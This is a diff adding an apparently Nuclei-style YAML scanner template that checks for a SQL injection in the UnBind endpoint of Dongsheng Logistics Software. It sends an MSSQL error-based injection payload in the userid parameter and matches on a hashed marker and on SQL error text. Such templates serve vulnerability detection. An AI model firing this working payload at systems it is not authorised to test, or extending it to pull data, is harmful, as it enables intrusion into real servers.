@@ -1,0 +1,34 @@
+id: poc-yaml-dongshengsoft-unbind-sqli
+info:
+  name: 东胜物流软件 UnBind SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Dongsheng Logistics Software's UnBind endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Mobile/Login/UnBind?userid=-2963%27+OR+1636+IN+%28SELECT+%28sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%29%29--+oTEn HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "SqlException"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
